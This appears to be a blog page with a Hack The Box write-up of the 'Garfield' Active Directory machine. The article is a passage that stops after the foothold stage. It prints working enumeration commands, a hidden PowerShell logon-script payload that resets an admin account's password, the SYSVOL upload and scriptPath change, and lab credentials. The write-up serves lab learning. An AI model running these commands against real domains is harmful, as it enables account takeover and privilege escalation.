@@ -1,0 +1,941 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Foued SAIDI">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://fouedsaidi.com/2026/11/07/hackthebox-garfield/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="OverviewGarfield is a hard-difficulty Windows machine from Hack The Box with the following scenario: enumerate writable AD objects with bloodyAD -&gt; notice scriptPath is writable on l.wilson -&gt; d">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackthebox: Garfield">
+<meta property="og:url" content="http://fouedsaidi.com/2026/11/07/Hackthebox-Garfield/index.html">
+<meta property="og:site_name" content="Foued Saidi&#39;s Blog">
+<meta property="og:description" content="OverviewGarfield is a hard-difficulty Windows machine from Hack The Box with the following scenario: enumerate writable AD objects with bloodyAD -&gt; notice scriptPath is writable on l.wilson -&gt; d">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Garfield/Garfield.png">
+<meta property="article:published_time" content="2026-11-07T13:30:00.000Z">
+<meta property="article:modified_time" content="2026-11-07T19:00:37.383Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Garfield/Garfield.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+    <meta name="theme-color" content="#5618ff">
+    <link rel="shortcut icon" href="/images/logo.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Hackthebox: Garfield -
+        
+        Foued Saidi&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"fouedsaidi.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"5px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Articles","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#5618ff","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Hello, I'm Foued SAIDI 👋","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":50,"starting_delay":500,"backing_delay":1200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kujen5","instagram":null,"zhihu":null,"twitter":"https://twitter.com/_kujen5","email":null,"linkedin":"https://www.linkedin.com/in/foued-saidi-pro/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/kujen5","LinkedIn":"https://www.linkedin.com/in/foued-saidi-pro/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":2},"tags":{"enable":true,"limit":3}},"footerStart":"2023/12/22 00:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Foued Saidi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        CATEGORIES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/about">ME
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/categories"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                CATEGORIES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" href="/about">ME</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Hackthebox: Garfield</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/logo.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Foued SAIDI</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv5</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2026-11-07 16:30</span>
+        <span class="mobile">2026-11-07 16:30</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2026-11-07 22:37</span>
+            <span class="mobile">2026-11-07 22:37</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Hackthebox/">Hackthebox</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>Garfield is a hard-difficulty Windows machine from Hack The Box with the following scenario: enumerate writable AD objects with bloodyAD -&gt; notice <code>scriptPath</code> is writable on l.wilson -&gt; drop a password-reset <code>.bat</code> in SYSVOL and abuse the logon script -&gt; l.wilson resets l.wilson_adm (ForceChangePassword) -&gt; WinRM on DC01 + user flag -&gt; l.wilson_adm can write the RODC Administrators group -&gt; add ourselves and create a fake machine account -&gt; set RBCD on RODC01 -&gt; S4U2self&#x2F;S4U2proxy to forge a <code>cifs/RODC01</code> ticket as Administrator -&gt; tunnel to the internal RODC subnet with chisel, bind port 445 unprivileged via a user namespace + socat, and bypass the +8h clock skew with libfaketime -&gt; psexec for SYSTEM on RODC01 -&gt; mimikatz <code>lsadump::lsa /inject</code> to pull the <code>krbtgt_8245</code> AES256 key -&gt; modify the RODC Password Replication Policy to allow Administrator -&gt; forge an RODC golden ticket and run the Kerberos Key List Attack to recover the Administrator NT hash -&gt; Pass-the-Hash -&gt; root.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Garfield/Garfield.png"
+                      alt="Garfield"
+                ><figcaption>Garfield</figcaption></figure></p>
+<p>This one is a proper AD chain. The whole box is built around a Read-Only Domain Controller (RODC), so if you’ve never played with RODC golden tickets or the Key List Attack before, this is a great box to learn them on. We’re also handed credentials up front (<code>j.arbuckle : Th1sD4mnC4t!@1978</code>), so it’s assumed-breach style from the start.</p>
+<p>Let me drop the two hosts into <code>/etc/hosts</code> before anything else, since the RODC lives on an internal subnet we’ll have to tunnel to later:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">10.129.26.128  garfield.htb DC01.garfield.htb dc01.garfield.htb</span><br><span class="line">192.168.100.2  RODC01.garfield.htb rodc01.garfield.htb</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -sC -sV -Pn -p- --min-rate 5000 10.129.26.128</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">53/tcp    open  domain        Simple DNS Plus</span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http</span><br><span class="line">636/tcp   open  tcpwrapped</span><br><span class="line">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP</span><br><span class="line">3269/tcp  open  tcpwrapped</span><br><span class="line">3389/tcp  open  ms-wbt-server Microsoft Terminal Services</span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0</span><br><span class="line">9389/tcp  open  mc-nmf        .NET Message Framing</span><br></pre></td></tr></table></figure></div>
+
+<p>The usual domain controller fingerprint, nothing surprising here. One thing worth writing down early though: the DC’s clock is <strong>+8 hours ahead</strong> of my Kali box. That doesn’t matter yet but it will absolutely bite us when we start doing Kerberos stuff, so keep it in the back of your head.</p>
+<p>First, let me make sure the creds we were given actually work:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ nxc smb 10.129.26.128 -u <span class="string">&#x27;j.arbuckle&#x27;</span> -p <span class="string">&#x27;Th1sD4mnC4t!@1978&#x27;</span></span><br><span class="line"></span><br><span class="line">SMB  10.129.26.128  445  DC01  [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:garfield.htb)</span><br><span class="line">SMB  10.129.26.128  445  DC01  [+] garfield.htb\j.arbuckle:Th1sD4mnC4t!@1978</span><br></pre></td></tr></table></figure></div>
+
+<p>Good, valid. Now let me see what j.arbuckle can actually touch in the directory. <code>bloodyAD</code>‘s <code>get writable</code> is perfect for this:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ bloodyAD --host 10.129.26.128 -u <span class="string">&#x27;j.arbuckle&#x27;</span> -p <span class="string">&#x27;Th1sD4mnC4t!@1978&#x27;</span> -d garfield.htb get writable</span><br><span class="line"></span><br><span class="line">distinguishedName: CN=Guest,CN=Users,DC=garfield,DC=htb</span><br><span class="line">permission: WRITE</span><br><span class="line"></span><br><span class="line">distinguishedName: CN=krbtgt_8245,CN=Users,DC=garfield,DC=htb</span><br><span class="line">permission: WRITE</span><br><span class="line"></span><br><span class="line">distinguishedName: CN=Jon Arbuckle,CN=Users,DC=garfield,DC=htb</span><br><span class="line">permission: WRITE</span><br><span class="line"></span><br><span class="line">distinguishedName: CN=Liz Wilson,CN=Users,DC=garfield,DC=htb</span><br><span class="line">permission: WRITE</span><br><span class="line"></span><br><span class="line">distinguishedName: CN=Liz Wilson ADM,CN=Users,DC=garfield,DC=htb</span><br><span class="line">permission: WRITE</span><br></pre></td></tr></table></figure></div>
+
+<p>Two things jump out here. First, there’s a <code>krbtgt_8245</code> account — that naming (<code>krbtgt_&lt;number&gt;</code>) is the dead giveaway of a <strong>Read-Only Domain Controller</strong>. So there’s an RODC hiding somewhere in this environment. Second, j.arbuckle can write attributes on both <code>l.wilson</code> and <code>l.wilson_adm</code>. If you drill into exactly which attribute is writable, the only interesting one is <code>scriptPath</code> — which is a classic logon-script abuse.</p>
+<p>Let me also peek at the shares quickly:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ nxc smb 10.129.26.128 -u <span class="string">&#x27;j.arbuckle&#x27;</span> -p <span class="string">&#x27;Th1sD4mnC4t!@1978&#x27;</span> --shares</span><br><span class="line"></span><br><span class="line">SMB  10.129.26.128  445  DC01  Share      Permissions  Remark</span><br><span class="line">SMB  10.129.26.128  445  DC01  ADMIN$                  Remote Admin</span><br><span class="line">SMB  10.129.26.128  445  DC01  C$                      Default share</span><br><span class="line">SMB  10.129.26.128  445  DC01  IPC$       READ         Remote IPC</span><br><span class="line">SMB  10.129.26.128  445  DC01  NETLOGON   READ         Logon server share</span><br><span class="line">SMB  10.129.26.128  445  DC01  SYSVOL     READ         Logon server share</span><br></pre></td></tr></table></figure></div>
+
+<p>NETLOGON and SYSVOL are readable, and crucially we can write into the SYSVOL scripts directory. That’s the other half of the logon-script trick.</p>
+<h2 id="Foothold-Logon-Script-Abuse"><a href="#Foothold-Logon-Script-Abuse" class="headerlink" title="Foothold - Logon Script Abuse"></a>Foothold - Logon Script Abuse</h2><p>So here’s the plan. The <code>scriptPath</code> attribute tells Windows which script to run when a user logs in, and it’s resolved relative to the NETLOGON&#x2F;SYSVOL scripts folder. If I can write a script to SYSVOL <em>and</em> point l.wilson’s <code>scriptPath</code> at it, then whenever l.wilson “logs in” (the box simulates logons), my script runs as l.wilson.</p>
+<p>And why do I care about running code as l.wilson? Because l.wilson has <code>User-Force-Change-Password</code> over <code>l.wilson_adm</code> — that’s a really common pattern where a user and their admin counterpart are linked. So my script is just going to reset l.wilson_adm’s password.</p>
+<p>The nice thing is this is a completely self-contained payload — no reverse shell, no racing a netcat listener. The script just resets a password and we’re done. I threw three different reset methods in there so whichever one the host supports fires:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> &gt; /tmp/printerDetect.bat &lt;&lt; <span class="string">&#x27;EOF&#x27;</span></span><br><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line">powershell -NoP -NonI -W Hidden -Exec Bypass -Command <span class="string">&quot;try &#123; Set-ADAccountPassword -Identity &#x27;l.wilson_adm&#x27; -NewPassword (ConvertTo-SecureString &#x27;Hacked123!&#x27; -AsPlainText -Force) -Reset &#125; catch &#123; try &#123; <span class="variable">$u</span>=[ADSI]&#x27;LDAP://CN=Liz Wilson ADM,CN=Users,DC=garfield,DC=htb&#x27;; <span class="variable">$u</span>.SetPassword(&#x27;Hacked123!&#x27;); <span class="variable">$u</span>.SetInfo() &#125; catch &#123;&#125; &#125;&quot;</span></span><br><span class="line">net user l.wilson_adm Hacked123! /domain</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure></div>
+
+<p>Upload it to the SYSVOL scripts folder:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ nxc smb 10.129.26.128 -u <span class="string">&#x27;j.arbuckle&#x27;</span> -p <span class="string">&#x27;Th1sD4mnC4t!@1978&#x27;</span> \</span><br><span class="line">    --share SYSVOL --put-file /tmp/printerDetect.bat \</span><br><span class="line">    <span class="string">&#x27;garfield.htb/scripts/printerDetect.bat&#x27;</span></span><br><span class="line"></span><br><span class="line">SMB  10.129.26.128  445  DC01  [+] Created file /tmp/printerDetect.bat on \\SYSVOL\garfield.htb/scripts/printerDetect.bat</span><br></pre></td></tr></table></figure></div>
+
+<p>Now point l.wilson’s <code>scriptPath</code> at it:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ bloodyAD --host garfield.htb -u j.arbuckle -p <span class="string">&#x27;Th1sD4mnC4t!@1978&#x27;</span> -d garfield.htb \</span><br><span class="line">    <span class="built_in">set</span> object <span class="string">&quot;CN=Liz Wilson,CN=Users,DC=garfield,DC=htb&quot;</span> scriptPath -v printerDetect.bat</span><br><span class="line"></span><br><span class="line">[+] CN=Liz Wilson,CN=Users,DC=garfield,DC=htb<span class="string">&#x27;s scriptPath has been updated</span></span><br></pre></td></tr></table></figure></div>
+
+<p>And now we wait for the simulated logon to fire. I just loop and keep trying the new creds:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="keyword">for</span> i <span class="keyword">in</span> $(<span class="built_in">seq</span> 1 10); <span class="keyword">do</span> <span class="built_in">sleep</span> 30; nxc smb 10.129.26.128 -u <span class="string">&#x27;l.wilson_adm&#x27;</span> -p <span class="string">&#x27;Hacked123!&#x27;</span> 2&gt;&amp;1 | <span class="built_in">tail</span> -1; <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">SMB  10.129.26.128  445  DC01  [+] garfield.htb\l.wilson_adm:Hacked123!</span><br></pre></td></tr></table></figure></div>
+
+<p>Reset fired on the very first cycle (~30 seconds). l.wilson_adm is now ours. Let me confirm WinRM works and grab the user flag while I’m at it:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ nxc winrm 10.129.26.128 -u <span class="string">&#x27;l.wilson_adm&#x27;</span> -p <span class="string">&#x27;Hacked123!&#x27;</span> \</span><br><span class="line">    -x <span class="string">&#x27;type C:\Users\l.wilson_adm\Desktop\user.txt&#x27;</span></span><br><span class="line"></span><br><span class="line">WINRM  10.129.26.128  5985  DC01  [+] garfield.htb\l.wilson_adm:Hacked123! (Pwn3d!)</span><br><span class="line">WINRM  10.129.26.128  5985  DC01  b896c403227e5657b4ce817ef9097160</span><br></pre></td></tr></table></figure></div>
+
+<p>And that’s the user flag. <code>Pwn3d!</code> on WinRM too, so we’ve got a shell on DC01.</p>
+<h2 id="Enumeration-as-l-wilson-adm"><a href="#Enumeration-as-l-wilson-adm" class="headerlink" title="Enumeration as l.wilson_adm"></a>Enumeration as l.wilson_adm</h2><p>Before diving into anything fancy, let me see what this new account is and what it can do:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ nxc winrm 10.129.26.128 -u <span class="string">&#x27;l.wilson_adm&#x27;</span> -p <span class="string">&#x27;Hacked123!&#x27;</span> -x <span class="string">&#x27;whoami /groups&#x27;</span></span><br><span class="line"></span><br><span class="line">GARFIELD\Tier 1</span><br><span class="line">BUILTIN\Remote Management Users</span><br><span class="line">BUILTIN\Users</span><br><span class="line"></span><br><span class="line">$ nxc winrm 10.129.26.128 -u <span class="string">&#x27;l.wilson_adm&#x27;</span> -p <span class="string">&#x27;Hacked123!&#x27;</span> -X <span class="string">&#x27;whoami /priv&#x27;</span></span><br><span class="line"></span><br><span class="line">SeMachineAccountPrivilege     Add workstations to domain     Enabled</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working <span class="built_in">set</span> Enabled</span><br></pre></td></tr></table></figure></div>
+
+<p><code>SeMachineAccountPrivilege</code> is enabled, which means l.wilson_adm can add new computer accounts to the domain (up to the default 10). File that away — we’re going to need a machine account for RBCD in a minute.</p>
+<p>Now let me look at the computers in the domain:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ nxc winrm 10.129.26.128 -u <span class="string">&#x27;l.wilson_adm&#x27;</span> -p <span class="string">&#x27;Hacked123!&#x27;</span> \</span><br><span class="line">    -X <span class="string">&#x27;Get-ADComputer -Filter * | Select-Object Name,DNSHostName&#x27;</span></span><br><span class="line"></span><br><span class="line">DC01    DC01.garfield.htb</span><br><span class="line">RODC01  RODC01.garfield.htb</span><br></pre></td></tr></table></figure></div>
+
+<p>There’s our RODC. DNS resolves <code>RODC01.garfield.htb</code> to <code>192.168.100.2</code>, which is an internal subnet we can’t reach directly from the VPN. The only host that can reach it is DC01 itself, which is dual-homed (<code>192.168.100.1</code> internally + <code>10.129.26.128</code> on our side). So anything we do against the RODC later is going to have to go through a tunnel pivoting off DC01.</p>
